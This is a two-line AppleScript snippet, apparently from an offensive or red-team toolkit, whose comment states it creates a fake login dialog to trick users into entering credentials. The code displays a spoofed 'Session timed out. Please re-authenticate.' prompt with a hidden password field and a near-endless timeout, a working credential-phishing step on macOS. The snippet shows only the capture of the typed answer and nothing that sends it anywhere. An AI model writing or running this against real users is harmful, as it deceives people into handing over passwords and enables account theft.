-- Creates a fake login dialog to trick users into entering credentials
display dialog "Session timed out. Please re-authenticate." default answer "" with hidden answer buttons {"Login"} default button 1 giving up after 999999
